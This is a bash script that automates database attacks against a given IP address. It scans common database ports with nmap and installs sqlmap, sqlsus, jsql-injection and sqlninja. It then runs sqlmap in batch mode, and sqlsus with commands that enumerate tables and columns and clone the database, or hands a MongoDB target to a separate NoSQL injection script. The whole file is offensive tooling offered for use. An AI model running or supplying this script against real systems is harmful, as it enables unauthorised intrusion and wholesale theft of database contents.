#!/bin/bash

tool_check(){
 tools="sqlmap sqlsus jsql-injection sqlninja"
 for i in $tools
 do
 if ! command -v $i >/dev/null                            #checking whether the mentions tools are already installed.
 then  
  echo "installing $i"
  sudo apt install $i                                     
  fi
 done
 echo "Required tools are already in place"
}

sql_map() {
 if [ "$2" == "GET" ]
 then
  sqlmap -u $1 --dbms=$3 --batch
 elif [ "$2" == "POST" ] 
 then 
  read -p "Enter request file name: " file_name
  if [ -e $file_name ]
  then
   sqlmap -r $file_name --dbms=$3 --batch
  else
   echo "file does not exist"
  fi
 fi
}

sql_sus() {
  if [ "$2" == "GET" ]
  then
   if ls | grep my.conf
   then
    sed -i "25d" my.conf
    word='$url_start'
    sed -i '25 i our '$word' = "'$1'";' my.conf
    sqlsus ./my.conf -e 'start;get tables;get columns;clone'
   else
    sqlsus --genconf my.conf                         
    sql_sus $1 $2
   fi
 
  elif [ "$2" == "POST" ] 
  then 
   if ls | grep my.conf
   then 
    echo "opening the configuration file to configure"
    gedit --wait my.conf
    sqlsus ./my.conf -e 'start;get tables;get columns;clone'
   else
    sqlsus --genconf my.conf                         
    sql_sus $1 $2
   fi
  fi
}

no_sql(){ 
 cd StealthNoSQL
 bash StealthNoSQL.sh
}

main() {
    ip=$1
    ports="3306,5432,1433,1434,27017,27018,27019,28017"                            # common ports for database services 
    service=$(nmap "$ip" -p "$ports" | grep open | cut -d " " -f 6)                # checking whether the service is running via nmap.
    echo "Service: $service"
    echo "checking for the installation of the tools to exploit"
    tool_check
    for i in $service; do
        if [ "$service" != "mongodb" ]                                           # cheking whether it is no sql
        then
            echo "SQL injection..."
            read -p "Enter the type of the request GET or POST: " req_type
            req_type="${req_type^^}"  

            if [ "$req_type" = "GET" ] 
            then
                read -p "Enter the url: " url
                echo "Using sqlmap to carry out sql injection"
                sql_map "$url" "$req_type" "$i"                         #sql map function call
                echo "Using sqlsus to carry out sql injection"
                sql_sus "$url" "$req_type"                              #sqlsus function call
            fi

            if [ "$req_type" = "POST" ]
            then
                echo "Using sqlmap to carry out sql injection"
                sql_map "dummy" "$req_type" "$i"
                echo "Using sqlsus to carry out sql injection"
                sql_sus "dummy" "$req_type"
            fi
            echo "Starting jsql-injection"
            jsql-injection                                             #starting jsql-injection application
        else
            echo "Nosql..."
            no_sql                                                     #nosql function call
        fi
    done
}

main "$1"

